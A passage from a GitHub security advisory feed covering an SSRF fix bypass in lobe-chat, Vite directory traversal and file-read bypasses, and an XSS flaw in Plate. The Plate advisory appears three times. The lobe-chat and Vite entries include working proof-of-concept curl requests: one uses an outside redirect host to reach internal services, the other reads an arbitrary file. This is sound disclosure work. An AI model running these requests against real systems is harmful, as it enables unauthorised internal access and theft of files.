<li><a href="https://github.com/advisories/GHSA-gcx4-mw62-g8wm">https://github.com/advisories/GHSA-gcx4-mw62-g8wm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gcx4-mw62-g8wm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-23T22:11:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@lobehub/chat] lobe-chat implemented an insufficient fix for GHSA-mxhq-xw3g-rphc (CVE-2024-32964)]]></title>
        <id>https://github.com/advisories/GHSA-3fc8-2r3f-8wrg</id>
        <link href="https://github.com/advisories/GHSA-3fc8-2r3f-8wrg"/>
        <updated>2024-09-23T20:30:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>SSRF protection implemented in <a href="https://github.com/lobehub/lobe-chat/blob/main/src/app/api/proxy/route.ts">https://github.com/lobehub/lobe-chat/blob/main/src/app/api/proxy/route.ts</a> does not consider redirect and could be bypassed when attacker provides external malicious url which redirects to internal resources like private network or loopback address.</p>
<h3 id="poc">PoC</h3>
<ol>
<li><p>Run lobe-chat in docker container. In my setup lobe-chat runs on 0.0.0.0:3210;</p>
</li>
<li><p>Create file dummy-server.js with the following content:</p>
</li>
</ol>
<pre><code>var http = require('http');
console.log("running server");
http.createServer(function (req, res) {
  console.log(req.url);
  res.writeHead(200, {'Content-Type': 'text/html'});
  res.end();
}).listen(3001, 'localhost');
</code></pre>
<p>And run </p>
<pre><code>node dummy-server.js
</code></pre>
<p>as an example server inside of container [1] (or in containers private network).</p>
<ol start="3">
<li>Run in terminal to perform request to lobe-chat instance from [1]</li>
</ol>
<pre><code>curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: 0.0.0.0:3210' -H $'Accept-Encoding: gzip, deflate, br' -H $'Referer: http://0.0.0.0:3210/settings/agent?agent=&amp;session=inbox&amp;tab=' -H $'Content-Type: text/plain;charset=UTF-8' -H $'Content-Length: 74' -H $'Origin: http://0.0.0.0:3210' -H $'Connection: keep-alive' -H $'Priority: u=0' \
    -b $'LOBE_LOCALE=en-EN; LOBE_THEME_PRIMARY_COLOR=undefined; LOBE_THEME_NEUTRAL_COLOR=undefined' \
    --data-binary $'http://130.193.49.129:8090/redirect?url=http://localhost:3001/iamssrf_1337' \
    $'http://0.0.0.0:3210/api/proxy'
</code></pre>
<p>where body contains url of server which redirects to internal network (in my case it redirects according url parameter).</p>
<ol start="4">
<li>Observe in output of [2]</li>
</ol>
<pre><code>running server
/iamssrf_1337
</code></pre>
<ol start="5">
<li>Attacker is able to perform SSRF attacks against lobe-chat despite <a href="https://github.com/lobehub/lobe-chat/blob/main/src/app/api/proxy/route.ts#L26">https://github.com/lobehub/lobe-chat/blob/main/src/app/api/proxy/route.ts#L26</a> check.</li>
</ol>
<h3 id="fix-recommendations">Fix recommendations:</h3>
<ol>
<li>Disable redirects - lobe-chat should consider explicitly disable redirects. </li>
<li>If redirects support is required, perform check before each http request.</li>
</ol>
<h3 id="impact">Impact</h3>
<p><a href="https://portswigger.net/web-security/ssrf">https://portswigger.net/web-security/ssrf</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lobehub/lobe-chat/security/advisories/GHSA-3fc8-2r3f-8wrg">https://github.com/lobehub/lobe-chat/security/advisories/GHSA-3fc8-2r3f-8wrg</a></li>
<li><a href="https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc">https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47066">https://nvd.nist.gov/vuln/detail/CVE-2024-47066</a></li>
<li><a href="https://github.com/lobehub/lobe-chat/commit/e960a23b0c69a5762eb27d776d33dac443058faf">https://github.com/lobehub/lobe-chat/commit/e960a23b0c69a5762eb27d776d33dac443058faf</a></li>
<li><a href="https://github.com/lobehub/lobe-chat/blob/main/src/app/api/proxy/route.ts">https://github.com/lobehub/lobe-chat/blob/main/src/app/api/proxy/route.ts</a></li>
<li><a href="https://github.com/advisories/GHSA-3fc8-2r3f-8wrg">https://github.com/advisories/GHSA-3fc8-2r3f-8wrg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3fc8-2r3f-8wrg</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-09-23T20:30:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite before v2.9.13 vulnerable to directory traversal via crafted URL to victim's service]]></title>
        <id>https://github.com/advisories/GHSA-mv48-hcvh-8jj8</id>
        <link href="https://github.com/advisories/GHSA-mv48-hcvh-8jj8"/>
        <updated>2024-09-23T19:18:33.000Z</updated>
        <content type="html"><![CDATA[<p>Vite before v2.9.13 was discovered to allow attackers to perform a directory traversal via a crafted URL to the victim's service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-35204">https://nvd.nist.gov/vuln/detail/CVE-2022-35204</a></li>
<li><a href="https://github.com/vitejs/vite/issues/8498">https://github.com/vitejs/vite/issues/8498</a></li>
<li><a href="https://github.com/vitejs/vite/releases/tag/v2.9.13">https://github.com/vitejs/vite/releases/tag/v2.9.13</a></li>
<li><a href="https://github.com/vitejs/vite/releases/tag/v3.0.0-beta.4">https://github.com/vitejs/vite/releases/tag/v3.0.0-beta.4</a></li>
<li><a href="https://github.com/vitejs/vite/commit/6851009e6725b17608113a5a63474280075cae1c">https://github.com/vitejs/vite/commit/6851009e6725b17608113a5a63474280075cae1c</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e109d64331d9fa57753832762c3573c3532a6947">https://github.com/vitejs/vite/commit/e109d64331d9fa57753832762c3573c3532a6947</a></li>
<li><a href="https://github.com/advisories/GHSA-mv48-hcvh-8jj8">https://github.com/advisories/GHSA-mv48-hcvh-8jj8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mv48-hcvh-8jj8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-19T00:00:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@udecode/plate-core] Plate allows arbitrary DOM attributes in element.attributes and leaf.attributes]]></title>
        <id>https://github.com/advisories/GHSA-73rg-f94j-xvhx</id>
        <link href="https://github.com/advisories/GHSA-73rg-f94j-xvhx"/>
        <updated>2024-09-20T22:07:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>One longstanding feature of Plate is the ability to add custom DOM attributes to any element or leaf using the <code>attributes</code> property. These attributes are passed to the node component using the <code>nodeProps</code> prop.</p>
<p>Note: The <code>attributes</code> prop that is typically rendered alongside <code>nodeProps</code> is unrelated.</p>
<pre><code class="language-ts">[{
  type: 'p',
  attributes: { 'data-my-attribute': 'This will be rendered on the paragraph element' },
  children: [{
    bold: true,
    attributes: { 'data-my-attribute': 'This will be rendered on the bold leaf element' },
    text: 'Bold text',
  }],
}]
</code></pre>
<pre><code class="language-tsx">const ParagraphElement = ({ attributes, nodeProps, children }) =&gt; (
  &lt;p
    {...attributes}
    {...nodeProps} // Arbitrary DOM attributes are injected here
  &gt;
    {children}
  &lt;/p&gt;
);

const BoldLeaf = ({ attributes, nodeProps, children }) =&gt; (
  &lt;strong
    {...attributes}
    {...nodeProps} // Arbitrary DOM attributes are injected here
  &gt;
    {children}
  &lt;/strong&gt;
);
</code></pre>
<p>It has come to our attention that this feature can be used for malicious purposes, including cross-site scripting (XSS) and information exposure (specifically, users' IP addresses and whether or not they have opened a malicious document).</p>
<p>Note that the risk of information exposure via <code>attributes</code> is only relevant to applications in which web requests to arbitrary URLs are not ordinarily allowed. Plate editors that allow users to embed images from arbitrary URLs, for example, already carry the risk of leaking users' IP addresses to third parties.</p>
<p>All Plate editors using an affected version of <code>@udecode/plate-core</code> are vulnerable to these information exposure attacks via the <code>style</code> attribute and other attributes that can cause web requests to be sent. </p>
<p>In addition, whether or not a Plate editor is vulnerable to cross-site scripting attacks using <code>attributes</code> depends on a number of factors. The most likely DOM attributes to be vulnerable are <code>href</code> and <code>src</code> on links and iframes respectively. Any component that spreads <code>{...nodeProps}</code> onto an <code>&lt;a&gt;</code> or <code>&lt;iframe&gt;</code> element and does not later override <code>href</code> or <code>src</code> will be vulnerable to XSS.</p>
<pre><code class="language-tsx">&lt;a
  href={sanitizedHref}
  {...attributes}
  {...nodeProps} // Definitely vulnerable to XSS since `href` can be overridden
&gt;
</code></pre>
<pre><code class="language-tsx">&lt;a
  {...attributes}
  {...nodeProps} // Probably not vulnerable to XSS via `href`
  href={sanitizedHref}
&gt;
</code></pre>
<pre><code class="language-tsx">&lt;a
  {...attributes}
  {...nodeProps} // May be vulnerable to XSS via `href` if `href` is sometimes omitted from `sanitizedLinkProps`
  {...sanitizedLinkProps}
&gt;
</code></pre>
<p>React does not allow passing a string to event handler props like <code>onClick</code>, so these are unlikely (but not impossible) to be vulnerable.</p>
<p>The attack surface is larger for users running older browsers, which may be vulnerable to XSS in DOM attributes that are less dangerous (although still vulnerable to information exposure) in modern browsers such as <code>style</code> or <code>background</code>.</p>
<p>Potential attack vectors for delivering malicious Slate content to users include:</p>
<ul>
<li>Opening a malicious document stored on the server</li>
<li>Pasting a malicious Slate fragment into a document</li>
<li>Receiving malicious Slate operations on a collaborative document</li>
</ul>
<h3 id="patches">Patches</h3>
<p>In patched versions of Plate, we have disabled <code>element.attributes</code> and <code>leaf.attributes</code> for most attribute names by default, with some exceptions including  <code>target</code>, <code>alt</code>, <code>width</code>, <code>height</code>, <code>colspan</code> and <code>rowspan</code> on the link, image, video, table cell and table header cell plugins.</p>
<p>If this is a breaking change for you, you can selectively re-enable <code>attributes</code> for certain plugins as follows. Please carefully research and assess the security implications of any attribute you allow, as even seemingly innocuous attributes such as <code>style</code> can be used maliciously.</p>
<h4 id="plate--37">Plate &gt;= 37</h4>
<p>For custom plugins, specify the list of allowed attribute names in the <code>node.dangerouslyAllowAttributes</code> plugin configuration option.</p>
<pre><code class="language-ts">const ImagePlugin = createPlatePlugin({
  key: 'image',
  node: {
    isElement: true,
    isVoid: true,
    dangerouslyAllowAttributes: ['alt'],
  },
});
</code></pre>
<p>To modify an existing plugin, use the <code>extend</code> method.</p>
<pre><code class="language-ts">const MyImagePlugin = ImagePlugin.extend({
  node: {
    dangerouslyAllowAttributes: ['alt'],
  },
});
</code></pre>
<h4 id="plate--37-1">Plate &lt; 37</h4>
<p>Note that the patch has been backported to versions <code>@udecode/plate-core@21.5.1</code> and <code>@udecode/plate-core@36.5.9</code> only.</p>
<p>For custom plugins, specify the list of allowed attribute names in the <code>dangerouslyAllowAttributes</code> plugin configuration option.</p>
<pre><code class="language-ts">const createImagePlugin = createPluginFactory({
  key: 'image',
  isElement: true,
  isVoid: true,
  dangerouslyAllowAttributes: ['alt'],
});
</code></pre>
<p>To modify an existing plugin, pass <code>dangerouslyAllowAttributes</code> to the plugin factory.</p>
<pre><code class="language-ts">createImagePlugin({
  dangerouslyAllowAttributes: ['alt'],
});
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>If you are unable to upgrade to any of the patched versions, you should use a tool like <a href="https://www.npmjs.com/package/patch-package"><code>patch-package</code></a> or <a href="https://yarnpkg.com/cli/patch"><code>yarn patch</code></a> to remove the logic from <code>@udecode/plate-core</code> that adds <code>attributes</code> to <code>nodeProps</code>.</p>
<p>This logic can be found in the <code>getRenderNodeProps</code> function and looks something like this. The entire <code>if</code> statment can safely be removed.</p>
<pre><code class="language-ts">  if (!newProps.nodeProps &amp;&amp; attributes) {
    newProps.nodeProps = attributes;
  }
</code></pre>
<p>After applying the patch, be sure to test its effectiveness by rendering a Slate value containing an <code>attributes</code> property on some element.</p>
<pre><code class="language-ts">[{
  type: 'p',
  attributes: { 'data-vulnerable': true },
  children: [{ text: 'My paragraph' }],
}]
</code></pre>
<p>If the patch was successful, the <code>data-vulnerable="true"</code> attribute should not be present on any DOM element when the Plate editor is rendered in the browser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/udecode/plate/security/advisories/GHSA-73rg-f94j-xvhx">https://github.com/udecode/plate/security/advisories/GHSA-73rg-f94j-xvhx</a></li>
<li><a href="https://github.com/udecode/plate/commit/16df6074edac22d56c60e0283eae0740230401c9">https://github.com/udecode/plate/commit/16df6074edac22d56c60e0283eae0740230401c9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47061">https://nvd.nist.gov/vuln/detail/CVE-2024-47061</a></li>
<li><a href="https://www.npmjs.com/package/patch-package">https://www.npmjs.com/package/patch-package</a></li>
<li><a href="https://yarnpkg.com/cli/patch">https://yarnpkg.com/cli/patch</a></li>
<li><a href="https://github.com/advisories/GHSA-73rg-f94j-xvhx">https://github.com/advisories/GHSA-73rg-f94j-xvhx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-73rg-f94j-xvhx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-20T14:41:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@udecode/plate-core] Plate allows arbitrary DOM attributes in element.attributes and leaf.attributes]]></title>
        <id>https://github.com/advisories/GHSA-73rg-f94j-xvhx</id>
        <link href="https://github.com/advisories/GHSA-73rg-f94j-xvhx"/>
        <updated>2024-09-20T22:07:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>One longstanding feature of Plate is the ability to add custom DOM attributes to any element or leaf using the <code>attributes</code> property. These attributes are passed to the node component using the <code>nodeProps</code> prop.</p>
<p>Note: The <code>attributes</code> prop that is typically rendered alongside <code>nodeProps</code> is unrelated.</p>
<pre><code class="language-ts">[{
  type: 'p',
  attributes: { 'data-my-attribute': 'This will be rendered on the paragraph element' },
  children: [{
    bold: true,
    attributes: { 'data-my-attribute': 'This will be rendered on the bold leaf element' },
    text: 'Bold text',
  }],
}]
</code></pre>
<pre><code class="language-tsx">const ParagraphElement = ({ attributes, nodeProps, children }) =&gt; (
  &lt;p
    {...attributes}
    {...nodeProps} // Arbitrary DOM attributes are injected here
  &gt;
    {children}
  &lt;/p&gt;
);

const BoldLeaf = ({ attributes, nodeProps, children }) =&gt; (
  &lt;strong
    {...attributes}
    {...nodeProps} // Arbitrary DOM attributes are injected here
  &gt;
    {children}
  &lt;/strong&gt;
);
</code></pre>
<p>It has come to our attention that this feature can be used for malicious purposes, including cross-site scripting (XSS) and information exposure (specifically, users' IP addresses and whether or not they have opened a malicious document).</p>
<p>Note that the risk of information exposure via <code>attributes</code> is only relevant to applications in which web requests to arbitrary URLs are not ordinarily allowed. Plate editors that allow users to embed images from arbitrary URLs, for example, already carry the risk of leaking users' IP addresses to third parties.</p>
<p>All Plate editors using an affected version of <code>@udecode/plate-core</code> are vulnerable to these information exposure attacks via the <code>style</code> attribute and other attributes that can cause web requests to be sent. </p>
<p>In addition, whether or not a Plate editor is vulnerable to cross-site scripting attacks using <code>attributes</code> depends on a number of factors. The most likely DOM attributes to be vulnerable are <code>href</code> and <code>src</code> on links and iframes respectively. Any component that spreads <code>{...nodeProps}</code> onto an <code>&lt;a&gt;</code> or <code>&lt;iframe&gt;</code> element and does not later override <code>href</code> or <code>src</code> will be vulnerable to XSS.</p>
<pre><code class="language-tsx">&lt;a
  href={sanitizedHref}
  {...attributes}
  {...nodeProps} // Definitely vulnerable to XSS since `href` can be overridden
&gt;
</code></pre>
<pre><code class="language-tsx">&lt;a
  {...attributes}
  {...nodeProps} // Probably not vulnerable to XSS via `href`
  href={sanitizedHref}
&gt;
</code></pre>
<pre><code class="language-tsx">&lt;a
  {...attributes}
  {...nodeProps} // May be vulnerable to XSS via `href` if `href` is sometimes omitted from `sanitizedLinkProps`
  {...sanitizedLinkProps}
&gt;
</code></pre>
<p>React does not allow passing a string to event handler props like <code>onClick</code>, so these are unlikely (but not impossible) to be vulnerable.</p>
<p>The attack surface is larger for users running older browsers, which may be vulnerable to XSS in DOM attributes that are less dangerous (although still vulnerable to information exposure) in modern browsers such as <code>style</code> or <code>background</code>.</p>
<p>Potential attack vectors for delivering malicious Slate content to users include:</p>
<ul>
<li>Opening a malicious document stored on the server</li>
<li>Pasting a malicious Slate fragment into a document</li>
<li>Receiving malicious Slate operations on a collaborative document</li>
</ul>
<h3 id="patches">Patches</h3>
<p>In patched versions of Plate, we have disabled <code>element.attributes</code> and <code>leaf.attributes</code> for most attribute names by default, with some exceptions including  <code>target</code>, <code>alt</code>, <code>width</code>, <code>height</code>, <code>colspan</code> and <code>rowspan</code> on the link, image, video, table cell and table header cell plugins.</p>
<p>If this is a breaking change for you, you can selectively re-enable <code>attributes</code> for certain plugins as follows. Please carefully research and assess the security implications of any attribute you allow, as even seemingly innocuous attributes such as <code>style</code> can be used maliciously.</p>
<h4 id="plate--37">Plate &gt;= 37</h4>
<p>For custom plugins, specify the list of allowed attribute names in the <code>node.dangerouslyAllowAttributes</code> plugin configuration option.</p>
<pre><code class="language-ts">const ImagePlugin = createPlatePlugin({
  key: 'image',
  node: {
    isElement: true,
    isVoid: true,
    dangerouslyAllowAttributes: ['alt'],
  },
});
</code></pre>
<p>To modify an existing plugin, use the <code>extend</code> method.</p>
<pre><code class="language-ts">const MyImagePlugin = ImagePlugin.extend({
  node: {
    dangerouslyAllowAttributes: ['alt'],
  },
});
</code></pre>
<h4 id="plate--37-1">Plate &lt; 37</h4>
<p>Note that the patch has been backported to versions <code>@udecode/plate-core@21.5.1</code> and <code>@udecode/plate-core@36.5.9</code> only.</p>
<p>For custom plugins, specify the list of allowed attribute names in the <code>dangerouslyAllowAttributes</code> plugin configuration option.</p>
<pre><code class="language-ts">const createImagePlugin = createPluginFactory({
  key: 'image',
  isElement: true,
  isVoid: true,
  dangerouslyAllowAttributes: ['alt'],
});
</code></pre>
<p>To modify an existing plugin, pass <code>dangerouslyAllowAttributes</code> to the plugin factory.</p>
<pre><code class="language-ts">createImagePlugin({
  dangerouslyAllowAttributes: ['alt'],
});
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>If you are unable to upgrade to any of the patched versions, you should use a tool like <a href="https://www.npmjs.com/package/patch-package"><code>patch-package</code></a> or <a href="https://yarnpkg.com/cli/patch"><code>yarn patch</code></a> to remove the logic from <code>@udecode/plate-core</code> that adds <code>attributes</code> to <code>nodeProps</code>.</p>
<p>This logic can be found in the <code>getRenderNodeProps</code> function and looks something like this. The entire <code>if</code> statment can safely be removed.</p>
<pre><code class="language-ts">  if (!newProps.nodeProps &amp;&amp; attributes) {
    newProps.nodeProps = attributes;
  }
</code></pre>
<p>After applying the patch, be sure to test its effectiveness by rendering a Slate value containing an <code>attributes</code> property on some element.</p>
<pre><code class="language-ts">[{
  type: 'p',
  attributes: { 'data-vulnerable': true },
  children: [{ text: 'My paragraph' }],
}]
</code></pre>
<p>If the patch was successful, the <code>data-vulnerable="true"</code> attribute should not be present on any DOM element when the Plate editor is rendered in the browser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/udecode/plate/security/advisories/GHSA-73rg-f94j-xvhx">https://github.com/udecode/plate/security/advisories/GHSA-73rg-f94j-xvhx</a></li>
<li><a href="https://github.com/udecode/plate/commit/16df6074edac22d56c60e0283eae0740230401c9">https://github.com/udecode/plate/commit/16df6074edac22d56c60e0283eae0740230401c9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47061">https://nvd.nist.gov/vuln/detail/CVE-2024-47061</a></li>
<li><a href="https://www.npmjs.com/package/patch-package">https://www.npmjs.com/package/patch-package</a></li>
<li><a href="https://yarnpkg.com/cli/patch">https://yarnpkg.com/cli/patch</a></li>
<li><a href="https://github.com/advisories/GHSA-73rg-f94j-xvhx">https://github.com/advisories/GHSA-73rg-f94j-xvhx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-73rg-f94j-xvhx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-20T14:41:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@udecode/plate-core] Plate allows arbitrary DOM attributes in element.attributes and leaf.attributes]]></title>
        <id>https://github.com/advisories/GHSA-73rg-f94j-xvhx</id>
        <link href="https://github.com/advisories/GHSA-73rg-f94j-xvhx"/>
        <updated>2024-09-20T22:07:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>One longstanding feature of Plate is the ability to add custom DOM attributes to any element or leaf using the <code>attributes</code> property. These attributes are passed to the node component using the <code>nodeProps</code> prop.</p>
<p>Note: The <code>attributes</code> prop that is typically rendered alongside <code>nodeProps</code> is unrelated.</p>
<pre><code class="language-ts">[{
  type: 'p',
  attributes: { 'data-my-attribute': 'This will be rendered on the paragraph element' },
  children: [{
    bold: true,
    attributes: { 'data-my-attribute': 'This will be rendered on the bold leaf element' },
    text: 'Bold text',
  }],
}]
</code></pre>
<pre><code class="language-tsx">const ParagraphElement = ({ attributes, nodeProps, children }) =&gt; (
  &lt;p
    {...attributes}
    {...nodeProps} // Arbitrary DOM attributes are injected here
  &gt;
    {children}
  &lt;/p&gt;
);

const BoldLeaf = ({ attributes, nodeProps, children }) =&gt; (
  &lt;strong
    {...attributes}
    {...nodeProps} // Arbitrary DOM attributes are injected here
  &gt;
    {children}
  &lt;/strong&gt;
);
</code></pre>
<p>It has come to our attention that this feature can be used for malicious purposes, including cross-site scripting (XSS) and information exposure (specifically, users' IP addresses and whether or not they have opened a malicious document).</p>
<p>Note that the risk of information exposure via <code>attributes</code> is only relevant to applications in which web requests to arbitrary URLs are not ordinarily allowed. Plate editors that allow users to embed images from arbitrary URLs, for example, already carry the risk of leaking users' IP addresses to third parties.</p>
<p>All Plate editors using an affected version of <code>@udecode/plate-core</code> are vulnerable to these information exposure attacks via the <code>style</code> attribute and other attributes that can cause web requests to be sent. </p>
<p>In addition, whether or not a Plate editor is vulnerable to cross-site scripting attacks using <code>attributes</code> depends on a number of factors. The most likely DOM attributes to be vulnerable are <code>href</code> and <code>src</code> on links and iframes respectively. Any component that spreads <code>{...nodeProps}</code> onto an <code>&lt;a&gt;</code> or <code>&lt;iframe&gt;</code> element and does not later override <code>href</code> or <code>src</code> will be vulnerable to XSS.</p>
<pre><code class="language-tsx">&lt;a
  href={sanitizedHref}
  {...attributes}
  {...nodeProps} // Definitely vulnerable to XSS since `href` can be overridden
&gt;
</code></pre>
<pre><code class="language-tsx">&lt;a
  {...attributes}
  {...nodeProps} // Probably not vulnerable to XSS via `href`
  href={sanitizedHref}
&gt;
</code></pre>
<pre><code class="language-tsx">&lt;a
  {...attributes}
  {...nodeProps} // May be vulnerable to XSS via `href` if `href` is sometimes omitted from `sanitizedLinkProps`
  {...sanitizedLinkProps}
&gt;
</code></pre>
<p>React does not allow passing a string to event handler props like <code>onClick</code>, so these are unlikely (but not impossible) to be vulnerable.</p>
<p>The attack surface is larger for users running older browsers, which may be vulnerable to XSS in DOM attributes that are less dangerous (although still vulnerable to information exposure) in modern browsers such as <code>style</code> or <code>background</code>.</p>
<p>Potential attack vectors for delivering malicious Slate content to users include:</p>
<ul>
<li>Opening a malicious document stored on the server</li>
<li>Pasting a malicious Slate fragment into a document</li>
<li>Receiving malicious Slate operations on a collaborative document</li>
</ul>
<h3 id="patches">Patches</h3>
<p>In patched versions of Plate, we have disabled <code>element.attributes</code> and <code>leaf.attributes</code> for most attribute names by default, with some exceptions including  <code>target</code>, <code>alt</code>, <code>width</code>, <code>height</code>, <code>colspan</code> and <code>rowspan</code> on the link, image, video, table cell and table header cell plugins.</p>
<p>If this is a breaking change for you, you can selectively re-enable <code>attributes</code> for certain plugins as follows. Please carefully research and assess the security implications of any attribute you allow, as even seemingly innocuous attributes such as <code>style</code> can be used maliciously.</p>
<h4 id="plate--37">Plate &gt;= 37</h4>
<p>For custom plugins, specify the list of allowed attribute names in the <code>node.dangerouslyAllowAttributes</code> plugin configuration option.</p>
<pre><code class="language-ts">const ImagePlugin = createPlatePlugin({
  key: 'image',
  node: {
    isElement: true,
    isVoid: true,
    dangerouslyAllowAttributes: ['alt'],
  },
});
</code></pre>
<p>To modify an existing plugin, use the <code>extend</code> method.</p>
<pre><code class="language-ts">const MyImagePlugin = ImagePlugin.extend({
  node: {
    dangerouslyAllowAttributes: ['alt'],
  },
});
</code></pre>
<h4 id="plate--37-1">Plate &lt; 37</h4>
<p>Note that the patch has been backported to versions <code>@udecode/plate-core@21.5.1</code> and <code>@udecode/plate-core@36.5.9</code> only.</p>
<p>For custom plugins, specify the list of allowed attribute names in the <code>dangerouslyAllowAttributes</code> plugin configuration option.</p>
<pre><code class="language-ts">const createImagePlugin = createPluginFactory({
  key: 'image',
  isElement: true,
  isVoid: true,
  dangerouslyAllowAttributes: ['alt'],
});
</code></pre>
<p>To modify an existing plugin, pass <code>dangerouslyAllowAttributes</code> to the plugin factory.</p>
<pre><code class="language-ts">createImagePlugin({
  dangerouslyAllowAttributes: ['alt'],
});
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>If you are unable to upgrade to any of the patched versions, you should use a tool like <a href="https://www.npmjs.com/package/patch-package"><code>patch-package</code></a> or <a href="https://yarnpkg.com/cli/patch"><code>yarn patch</code></a> to remove the logic from <code>@udecode/plate-core</code> that adds <code>attributes</code> to <code>nodeProps</code>.</p>
<p>This logic can be found in the <code>getRenderNodeProps</code> function and looks something like this. The entire <code>if</code> statment can safely be removed.</p>
<pre><code class="language-ts">  if (!newProps.nodeProps &amp;&amp; attributes) {
    newProps.nodeProps = attributes;
  }
</code></pre>
<p>After applying the patch, be sure to test its effectiveness by rendering a Slate value containing an <code>attributes</code> property on some element.</p>
<pre><code class="language-ts">[{
  type: 'p',
  attributes: { 'data-vulnerable': true },
  children: [{ text: 'My paragraph' }],
}]
</code></pre>
<p>If the patch was successful, the <code>data-vulnerable="true"</code> attribute should not be present on any DOM element when the Plate editor is rendered in the browser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/udecode/plate/security/advisories/GHSA-73rg-f94j-xvhx">https://github.com/udecode/plate/security/advisories/GHSA-73rg-f94j-xvhx</a></li>
<li><a href="https://github.com/udecode/plate/commit/16df6074edac22d56c60e0283eae0740230401c9">https://github.com/udecode/plate/commit/16df6074edac22d56c60e0283eae0740230401c9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47061">https://nvd.nist.gov/vuln/detail/CVE-2024-47061</a></li>
<li><a href="https://www.npmjs.com/package/patch-package">https://www.npmjs.com/package/patch-package</a></li>
<li><a href="https://yarnpkg.com/cli/patch">https://yarnpkg.com/cli/patch</a></li>
<li><a href="https://github.com/advisories/GHSA-73rg-f94j-xvhx">https://github.com/advisories/GHSA-73rg-f94j-xvhx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-73rg-f94j-xvhx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-20T14:41:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite's `server.fs.deny` is bypassed when using `?import&raw`]]></title>
        <id>https://github.com/advisories/GHSA-9cwx-2883-4wfx</id>
        <link href="https://github.com/advisories/GHSA-9cwx-2883-4wfx"/>
        <updated>2024-09-19T18:34:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="details">Details</h3>
<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?import&amp;raw</code> to the URL bypasses this limitation and returns the file content if it exists.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-sh">$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" &gt; /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx">https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx</a></li>
<li><a href="https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249">https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249</a></li>
<li><a href="https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34">https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34</a></li>
<li><a href="https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd">https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6">https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6</a></li>
